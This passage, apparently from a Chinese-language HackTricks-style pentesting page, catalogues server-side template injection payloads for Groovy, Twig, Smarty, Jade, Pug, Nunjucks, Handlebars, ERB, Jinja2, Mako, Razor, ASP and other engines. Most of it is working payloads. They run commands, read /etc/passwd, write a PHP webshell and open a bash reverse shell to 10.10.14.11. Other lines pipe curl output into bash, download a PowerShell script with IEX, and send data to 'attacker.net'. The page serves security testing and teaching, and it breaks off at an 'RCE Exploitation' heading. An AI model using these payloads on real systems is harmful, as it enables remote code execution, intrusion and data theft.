this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
</code></pre>
<h3 id="其他-java"><a class="header" href="#其他-java">其他 Java</a></h3>
<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption><p><a href="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*NHgR25-CMICMhPOaIJzqwQ.jpeg">https://miro.medium.com/v2/resize:fit:1100/format:webp/1*NHgR25-CMICMhPOaIJzqwQ.jpeg</a></p></figcaption></figure>
<ul>
<li>更多信息请访问 <a href="https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756">https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756</a></li>
</ul>
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
<p>​​<a href="https://www.rootedcon.com/"><strong>RootedCON</strong></a> 是 <strong>西班牙</strong> 最相关的网络安全事件，也是 <strong>欧洲</strong> 最重要的事件之一。该大会 <strong>旨在促进技术知识</strong>，是各个学科的技术和网络安全专业人士的热烈交流平台。</p>
<p>{% embed url="https://www.rootedcon.com/" %}</p>
<h2 id=""><a class="header" href="#"></a></h2>
<h3 id="smarty-php"><a class="header" href="#smarty-php">Smarty (PHP)</a></h3>
<pre><code class="language-php">{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"&lt;?php passthru($_GET['cmd']); ?&gt;",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li>在 <a href="https://portswigger.net/research/server-side-template-injection">https://portswigger.net/research/server-side-template-injection</a> 的 Smarty 部分</li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty</a></li>
</ul>
<h3 id="twig-php"><a class="header" href="#twig-php">Twig (PHP)</a></h3>
<ul>
<li><code>{{7*7}} = 49</code></li>
<li><code>${7*7} = ${7*7}</code></li>
<li><code>{{7*'7'}} = 49</code></li>
<li><code>{{1/0}} = Error</code></li>
<li><code>{{foobar}} Nothing</code></li>
</ul>
<pre><code class="language-python">#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id',""]|sort('system')}}

#Hide warnings and errors for automatic exploitation
{{["error_reporting", "0"]|sort("ini_set")}}
</code></pre>
<p><strong>Twig - 模板格式</strong></p>
<pre><code class="language-php">$output = $twig &gt; render (
'Dear' . $_GET['custom_greeting'],
array("first_name" =&gt; $user.first_name)
);

$output = $twig &gt; render (
"Dear {first_name}",
array("first_name" =&gt; $user.first_name)
);
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li>在 <a href="https://portswigger.net/research/server-side-template-injection">https://portswigger.net/research/server-side-template-injection</a> 的 Twig 和 Twig (Sandboxed) 部分</li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig</a></li>
</ul>
<h3 id="plates-php"><a class="header" href="#plates-php">Plates (PHP)</a></h3>
<p>Plates 是一个原生于 PHP 的模板引擎，受到 Twig 的启发。然而，与引入新语法的 Twig 不同，Plates 在模板中利用原生 PHP 代码，使其对 PHP 开发者直观易懂。</p>
<p>控制器：</p>
<pre><code class="language-php">// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates-&gt;render('profile', ['name' =&gt; 'Jonathan']);
</code></pre>
<p>页面模板：</p>
<pre><code class="language-php">&lt;?php $this-&gt;layout('template', ['title' =&gt; 'User Profile']) ?&gt;

&lt;h1&gt;User Profile&lt;/h1&gt;
&lt;p&gt;Hello, &lt;?=$this-&gt;e($name)?&gt;&lt;/p&gt;
</code></pre>
<p>布局模板：</p>
<pre><code class="language-html">&lt;html&gt;
&lt;head&gt;
&lt;title&gt;&lt;?=$this-&gt;e($title)?&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;?=$this-&gt;section('content')?&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates</a></li>
</ul>
<h3 id="phplib-和-html_template_phplib-php"><a class="header" href="#phplib-和-html_template_phplib-php">PHPlib 和 HTML_Template_PHPLIB (PHP)</a></h3>
<p><a href="https://github.com/pear/HTML_Template_PHPLIB">HTML_Template_PHPLIB</a> 与 PHPlib 相同，但移植到 Pear。</p>
<p><code>authors.tpl</code></p>
<pre><code class="language-html">&lt;html&gt;
&lt;head&gt;&lt;title&gt;{PAGE_TITLE}&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;table&gt;
&lt;caption&gt;Authors&lt;/caption&gt;
&lt;thead&gt;
&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Email&lt;/th&gt;&lt;/tr&gt;
&lt;/thead&gt;
&lt;tfoot&gt;
&lt;tr&gt;&lt;td colspan="2"&gt;{NUM_AUTHORS}&lt;/td&gt;&lt;/tr&gt;
&lt;/tfoot&gt;
&lt;tbody&gt;
&lt;!-- BEGIN authorline --&gt;
&lt;tr&gt;&lt;td&gt;{AUTHOR_NAME}&lt;/td&gt;&lt;td&gt;{AUTHOR_EMAIL}&lt;/td&gt;&lt;/tr&gt;
&lt;!-- END authorline --&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p><code>authors.php</code></p>
<pre><code class="language-php">&lt;?php
//we want to display this author list
$authors = array(
'Christian Weiske'  =&gt; 'cweiske@php.net',
'Bjoern Schotte'     =&gt; 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =&amp; new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t-&gt;setFile('authors', 'authors.tpl');
//set block
$t-&gt;setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t-&gt;setVar('NUM_AUTHORS', count($authors));
$t-&gt;setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name =&gt; $email) {
$t-&gt;setVar('AUTHOR_NAME', $name);
$t-&gt;setVar('AUTHOR_EMAIL', $email);
$t-&gt;parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t-&gt;finish($t-&gt;parse('OUT', 'authors'));
?&gt;
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib</a></li>
</ul>
<h3 id="其他-php"><a class="header" href="#其他-php">其他 PHP</a></h3>
<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption><p><a href="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*u4h8gWhE8gD5zOtiDQalqw.jpeg">https://miro.medium.com/v2/resize:fit:1100/format:webp/1*u4h8gWhE8gD5zOtiDQalqw.jpeg</a></p></figcaption></figure>
<ul>
<li>更多信息在 <a href="https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756">https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756</a></li>
</ul>
<h3 id="jade-nodejs"><a class="header" href="#jade-nodejs">Jade (NodeJS)</a></h3>
<pre><code class="language-javascript">- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
</code></pre>
<pre><code class="language-javascript">#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li>在 <a href="https://portswigger.net/research/server-side-template-injection">https://portswigger.net/research/server-side-template-injection</a> 的 Jade 部分</li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen</a></li>
</ul>
<h3 id="pattemplate-php"><a class="header" href="#pattemplate-php">patTemplate (PHP)</a></h3>
<blockquote>
<p><a href="https://github.com/wernerwa/pat-template">patTemplate</a> 是一个非编译的 PHP 模板引擎，使用 XML 标签将文档分成不同部分</p>
</blockquote>
<pre><code class="language-xml">&lt;patTemplate:tmpl name="page"&gt;
This is the main page.
&lt;patTemplate:tmpl name="foo"&gt;
It contains another template.
&lt;/patTemplate:tmpl&gt;
&lt;patTemplate:tmpl name="hello"&gt;
Hello {NAME}.&lt;br/&gt;
&lt;/patTemplate:tmpl&gt;
&lt;/patTemplate:tmpl&gt;
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate</a></li>
</ul>
<h3 id="handlebars-nodejs"><a class="header" href="#handlebars-nodejs">Handlebars (NodeJS)</a></h3>
<p>路径遍历（更多信息 <a href="https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/">这里</a>）。</p>
<pre><code class="language-bash">curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
</code></pre>
<ul>
<li>= 错误</li>
<li>${7*7} = ${7*7}</li>
<li>无内容</li>
</ul>
<pre><code class="language-java">{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li><a href="http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html">http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html</a></li>
</ul>
<h3 id="jsrender-nodejs"><a class="header" href="#jsrender-nodejs">JsRender (NodeJS)</a></h3>
<div class="table-wrapper"><table><thead><tr><th><strong>模板</strong></th><th><strong>描述</strong></th></tr></thead><tbody>
<tr><td></td><td>评估并渲染输出</td></tr>
<tr><td></td><td>评估并渲染HTML编码输出</td></tr>
<tr><td></td><td>注释</td></tr>
<tr><td>和</td><td>允许代码（默认禁用）</td></tr>
</tbody></table>
</div>
<ul>
<li>= 49</li>
</ul>
<p><strong>客户端</strong></p>
<pre><code class="language-python">{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
</code></pre>
<p><strong>服务器端</strong></p>
<pre><code class="language-bash">{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li><a href="https://appcheck-ng.com/template-injection-jsrender-jsviews/">https://appcheck-ng.com/template-injection-jsrender-jsviews/</a></li>
</ul>
<h3 id="pugjs-nodejs"><a class="header" href="#pugjs-nodejs">PugJs (NodeJS)</a></h3>
<ul>
<li><code>#{7*7} = 49</code></li>
<li><code>#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}</code></li>
<li><code>#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}</code></li>
</ul>
<p><strong>示例服务器端渲染</strong></p>
<pre><code class="language-javascript">var pugjs = require('pug');
home = pugjs.render(injected_page)
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li><a href="https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/">https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/</a></li>
</ul>
<h3 id="nunjucks-nodejs"><a class="header" href="#nunjucks-nodejs">NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a></a></h3>
<ul>
<li>{{7*7}} = 49</li>
<li>{{foo}} = 无输出</li>
<li>#{7*7} = #{7*7}</li>
<li>{{console.log(1)}} = 错误</li>
</ul>
<pre><code class="language-javascript">{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.11/6767 0&gt;&amp;1\"')")()}}
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li><a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine">http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine</a></li>
</ul>
<h3 id="其他-nodejs"><a class="header" href="#其他-nodejs">其他 NodeJS</a></h3>
<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p><a href="https://miro.medium.com/v2/resize:fit:640/format:webp/1*J4gQBzN8Gbj0CkgSLLhigQ.jpeg">https://miro.medium.com/v2/resize:fit:640/format:webp/1*J4gQBzN8Gbj0CkgSLLhigQ.jpeg</a></p></figcaption></figure>
<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p><a href="https://miro.medium.com/v2/resize:fit:640/format:webp/1*jj_-oBi3gZ6UNTvkBogA6Q.jpeg">https://miro.medium.com/v2/resize:fit:640/format:webp/1*jj_-oBi3gZ6UNTvkBogA6Q.jpeg</a></p></figcaption></figure>
<ul>
<li>更多信息请访问 <a href="https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756">https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756</a></li>
</ul>
<h3 id="erb-ruby"><a class="header" href="#erb-ruby">ERB (Ruby)</a></h3>
<ul>
<li><code>{{7*7}} = {{7*7}}</code></li>
<li><code>${7*7} = ${7*7}</code></li>
<li><code>&lt;%= 7*7 %&gt; = 49</code></li>
<li><code>&lt;%= foobar %&gt; = Error</code></li>
</ul>
<pre><code class="language-python">&lt;%= system("whoami") %&gt; #Execute code
&lt;%= Dir.entries('/') %&gt; #List folder
&lt;%= File.open('/etc/passwd').read %&gt; #Read file

&lt;%= system('cat /etc/passwd') %&gt;
&lt;%= `ls /` %&gt;
&lt;%= IO.popen('ls /').readlines()  %&gt;
&lt;% require 'open3' %&gt;&lt;% @a,@b,@c,@d=Open3.popen3('whoami') %&gt;&lt;%= @b.readline()%&gt;
&lt;% require 'open4' %&gt;&lt;% @a,@b,@c,@d=Open4.popen4('whoami') %&gt;&lt;%= @c.readline()%&gt;
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby</a></li>
</ul>
<h3 id="slim-ruby"><a class="header" href="#slim-ruby">Slim (Ruby)</a></h3>
<ul>
<li><code>{ 7 * 7 }</code></li>
</ul>
<pre><code>{ %x|env| }
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby</a></li>
</ul>
<h3 id="其他-ruby"><a class="header" href="#其他-ruby">其他 Ruby</a></h3>
<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption><p><a href="https://miro.medium.com/v2/resize:fit:640/format:webp/1*VeZvEGI6rBP_tH-V0TqAjQ.jpeg">https://miro.medium.com/v2/resize:fit:640/format:webp/1*VeZvEGI6rBP_tH-V0TqAjQ.jpeg</a></p></figcaption></figure>
<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption><p><a href="https://miro.medium.com/v2/resize:fit:640/format:webp/1*m-iSloHPqRUriLOjpqpDgg.jpeg">https://miro.medium.com/v2/resize:fit:640/format:webp/1*m-iSloHPqRUriLOjpqpDgg.jpeg</a></p></figcaption></figure>
<ul>
<li>更多信息请查看 <a href="https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756">https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756</a></li>
</ul>
<h3 id="python"><a class="header" href="#python">Python</a></h3>
<p>查看以下页面以了解关于 <strong>绕过沙箱的任意命令执行</strong> 的技巧：</p>
<p>{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
<a href="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/">bypass-python-sandboxes</a>
{% endcontent-ref %}</p>
<h3 id="tornado-python"><a class="header" href="#tornado-python">Tornado (Python)</a></h3>
<ul>
<li><code>{{7*7}} = 49</code></li>
<li><code>${7*7} = ${7*7}</code></li>
<li><code>{{foobar}} = Error</code></li>
<li><code>{{7*'7'}} = 7777777</code></li>
</ul>
<pre><code class="language-python">{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}







{{os.system('whoami')}}
{{os.system('whoami')}}
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li><a href="https://ajinabraham.com/blog/server-side-template-injection-in-tornado">https://ajinabraham.com/blog/server-side-template-injection-in-tornado</a></li>
</ul>
<h3 id="jinja2-python"><a class="header" href="#jinja2-python">Jinja2 (Python)</a></h3>
<p><a href="http://jinja.pocoo.org">官方网站</a></p>
<blockquote>
<p>Jinja2 是一个功能齐全的 Python 模板引擎。它具有完整的 Unicode 支持、可选的集成沙箱执行环境，广泛使用并且是 BSD 许可的。</p>
</blockquote>
<ul>
<li><code>{{7*7}} = 错误</code></li>
<li><code>${7*7} = ${7*7}</code></li>
<li><code>{{foobar}} 无</code></li>
<li><code>{{4*4}}[[5*5]]</code></li>
<li><code>{{7*'7'}} = 7777777</code></li>
<li><code>{{config}}</code></li>
<li><code>{{config.items()}}</code></li>
<li><code>{{settings.SECRET_KEY}}</code></li>
<li><code>{{settings}}</code></li>
<li><code>&lt;div data-gb-custom-block data-tag="debug"&gt;&lt;/div&gt;</code></li>
</ul>
<pre><code class="language-python">{% raw %}
{% debug %}
{% endraw %}







{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
</code></pre>
<p><strong>Jinja2 - 模板格式</strong></p>
<pre><code class="language-python">{% raw %}
{% extends "layout.html" %}
{% block body %}
&lt;ul&gt;
{% for user in users %}
&lt;li&gt;&lt;a href="{{ user.url }}"&gt;{{ user.username }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/ul&gt;
{% endblock %}
{% endraw %}


</code></pre>
<p><a href="https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/"><strong>RCE 不依赖于</strong></a> <code>__builtins__</code>:</p>
<pre><code class="language-python">{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
</code></pre>
<p><strong>关于如何滥用 Jinja 的更多细节</strong>：</p>
<p>{% content-ref url="jinja2-ssti.md" %}
<a href="jinja2-ssti.html">jinja2-ssti.md</a>
{% endcontent-ref %}</p>
<p>其他有效载荷在 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2</a></p>
<h3 id="mako-python"><a class="header" href="#mako-python">Mako (Python)</a></h3>
<pre><code class="language-python">&lt;%
import os
x=os.popen('id').read()
%&gt;
${x}
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako</a></li>
</ul>
<h3 id="其他-python"><a class="header" href="#其他-python">其他 Python</a></h3>
<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption><p><a href="https://miro.medium.com/v2/resize:fit:640/format:webp/1*3RO051EgizbEer-mdHD8Kg.jpeg">https://miro.medium.com/v2/resize:fit:640/format:webp/1*3RO051EgizbEer-mdHD8Kg.jpeg</a></p></figcaption></figure>
<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption><p><a href="https://miro.medium.com/v2/resize:fit:640/format:webp/1*GY1Tij_oecuDt4EqINNAwg.jpeg">https://miro.medium.com/v2/resize:fit:640/format:webp/1*GY1Tij_oecuDt4EqINNAwg.jpeg</a></p></figcaption></figure>
<ul>
<li>更多信息在 <a href="https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756">https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756</a></li>
</ul>
<h3 id="razor-net"><a class="header" href="#razor-net">Razor (.Net)</a></h3>
<ul>
<li><code>@(2+2) &lt;= 成功</code></li>
<li><code>@() &lt;= 成功</code></li>
<li><code>@("{{code}}") &lt;= 成功</code></li>
<li><code>@ &lt;= 成功</code></li>
<li><code>@{} &lt;= 错误！</code></li>
<li><code>@{ &lt;= 错误！</code></li>
<li><code>@(1+2)</code></li>
<li><code>@( //C#代码 )</code></li>
<li><code>@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE &gt; C:/Windows/Tasks/test.txt");</code></li>
<li><code>@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAYQBzAGsAcwBcAHQAZQBzAHQAbQBlAHQANgA0AC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");</code></li>
</ul>
<p>.NET <code>System.Diagnostics.Process.Start</code> 方法可用于在服务器上启动任何进程，从而创建 webshell。您可以在 <a href="https://github.com/cnotin/RazorVulnerableApp">https://github.com/cnotin/RazorVulnerableApp</a> 找到一个易受攻击的 webapp 示例。</p>
<p><strong>更多信息</strong></p>
<ul>
<li><a href="https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/">https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/</a></li>
<li><a href="https://www.schtech.co.uk/razor-pages-ssti-rce/">https://www.schtech.co.uk/razor-pages-ssti-rce/</a></li>
</ul>
<h3 id="asp"><a class="header" href="#asp">ASP</a></h3>
<ul>
<li><code>&lt;%= 7*7 %&gt;</code> = 49</li>
<li><code>&lt;%= "foo" %&gt;</code> = foo</li>
<li><code>&lt;%= foo %&gt;</code> = 无</li>
<li><code>&lt;%= response.write(date()) %&gt;</code> = &lt;日期&gt;</li>
</ul>
<pre><code class="language-xml">&lt;%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %&gt;
</code></pre>
<p><strong>更多信息</strong></p>
<ul>
<li><a href="https://www.w3schools.com/asp/asp_examples.asp">https://www.w3schools.com/asp/asp_examples.asp</a></li>
</ul>
<h3 id="mojolicious-perl"><a class="header" href="#mojolicious-perl">Mojolicious (Perl)</a></h3>
<p>即使是perl，它也使用像Ruby中的ERB这样的标签。</p>
<ul>
<li><code>&lt;%= 7*7 %&gt; = 49</code></li>
<li><code>&lt;%= foobar %&gt; = Error</code></li>
</ul>
<pre><code>&lt;%= perl code %&gt;
&lt;% perl code %&gt;
</code></pre>
<h3 id="ssti-in-go"><a class="header" href="#ssti-in-go">SSTI in GO</a></h3>
<p>在 Go 的模板引擎中，可以通过特定的有效载荷确认其使用：</p>
<ul>
<li><code>{{ . }}</code>：揭示数据结构输入。例如，如果传递了一个具有 <code>Password</code> 属性的对象，<code>{{ .Password }}</code> 可能会暴露它。</li>
<li><code>{{printf "%s" "ssti" }}</code>：预计显示字符串 "ssti"。</li>
<li><code>{{html "ssti"}}</code>，<code>{{js "ssti"}}</code>：这些有效载荷应返回 "ssti"，而不附加 "html" 或 "js"。可以在 Go 文档中进一步探索指令 <a href="https://golang.org/pkg/text/template">这里</a>。</li>
</ul>
<figure><img src="../../.gitbook/assets/image (8).png" alt="" width="375"><figcaption><p><a href="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*rWpWndkQ7R6FycrgZm4h2A.jpeg">https://miro.medium.com/v2/resize:fit:1100/format:webp/1*rWpWndkQ7R6FycrgZm4h2A.jpeg</a></p></figcaption></figure>
<p><strong>XSS Exploitation</strong></p>
<p>使用 <code>text/template</code> 包，XSS 可以通过直接插入有效载荷来实现。相反，<code>html/template</code> 包对响应进行编码以防止这种情况（例如，<code>{{"&lt;script&gt;alert(1)&lt;/script&gt;"}}</code> 结果为 <code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code>）。然而，在 Go 中，模板定义和调用可以绕过这种编码：{{define "T1"}}alert(1){{end}} {{template "T1"}}</p>
<p>vbnet Copy code</p>
<p><strong>RCE Exploitation</strong></p>
